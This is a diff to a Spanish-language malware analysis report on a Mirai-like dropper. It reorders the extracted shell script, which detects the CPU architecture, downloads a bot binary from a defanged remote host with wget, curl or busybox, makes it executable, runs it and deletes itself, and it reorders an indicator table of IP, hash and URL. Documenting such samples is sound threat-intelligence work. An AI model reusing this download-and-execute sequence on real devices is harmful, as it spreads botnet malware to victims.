@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto asociado a la familia **mirai-like** con evidencia suficiente para atribución. Comportamientos destacados: Reconocimiento del sistema, Descarga remota, Cambio de permisos, Limpieza. Se asociaron 17 comandos observados o extraídos.
+Artefacto asociado a la familia **mirai-like** con evidencia suficiente para atribución. Comportamientos destacados: Reconocimiento del sistema, Descarga remota, Cambio de permisos, Limpieza. Se identificaron 17 comandos observados o extraídos. Se identificaron 11 indicadores técnicos.
+
 
 ## 🏷️ Clasificación
 
@@ -15,7 +16,7 @@ Artefacto asociado a la familia **mirai-like** con evidencia suficiente para atr
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T21:10:53+00:00`
+- **Registrado:** `2026-08-09T21:10:53.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -59,29 +60,29 @@ arm*)       BIN="bot.arm" ;;
 x86_64)     BIN="bot.x86_64" ;;
 i686)       BIN="bot.x86_64" ;;
 *)          BIN="bot.mips" ;;
-/tmp/.d </dev/null >/dev/null 2>&1 &
 # Try wget, curl, busybox wget
+wget -q hxxp://$S:$P/$BIN -O /tmp/.d 2>/dev/null || \
+curl -s -o /tmp/.d hxxp://$S:$P/$BIN 2>/dev/null || \
 busybox wget -q -O /tmp/.d hxxp://$S:$P/$BIN 2>/dev/null
 chmod 777 /tmp/.d
-curl -s -o /tmp/.d hxxp://$S:$P/$BIN 2>/dev/null || \
+/tmp/.d </dev/null >/dev/null 2>&1 &
 rm -f /tmp/.d $0
-wget -q hxxp://$S:$P/$BIN -O /tmp/.d 2>/dev/null || \
 ```
 
 ## 🌐 Indicadores
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 80.96.112.XXX | static_analysis |
 | url | hxxp://$S:$P/$BIN | strings |
-| hash | 37a369285464f8de9c6c0f415202a1a2db7dc526614fb961420b48d10979a242 | static_analysis |
-| command | /tmp/.d </dev/null >/dev/null 2>&1 & | strings |
+| ip | 80.96.112.XXX | static_analysis |
 | command | # Try wget, curl, busybox wget | strings |
+| command | wget -q hxxp://$S:$P/$BIN -O /tmp/.d 2>/dev/null \|\| \ | strings |
+| command | curl -s -o /tmp/.d hxxp://$S:$P/$BIN 2>/dev/null \|\| \ | strings |
 | command | busybox wget -q -O /tmp/.d hxxp://$S:$P/$BIN 2>/dev/null | strings |
 | command | chmod 777 /tmp/.d | strings |
-| command | curl -s -o /tmp/.d hxxp://$S:$P/$BIN 2>/dev/null \|\| \ | strings |
+| command | /tmp/.d </dev/null >/dev/null 2>&1 & | strings |
 | command | rm -f /tmp/.d $0 | strings |
-| command | wget -q hxxp://$S:$P/$BIN -O /tmp/.d 2>/dev/null \|\| \ | strings |
+| hash | 37a369285464f8de9c6c0f415202a1a2db7dc526614fb961420b48d10979a242 | static_analysis |
 | url | hxxp://80[.]96[.]112[.]XXX:8080/bot[.]sh | source_url |
 | domain | 80[.]96[.]112[.]XXX |  |
 
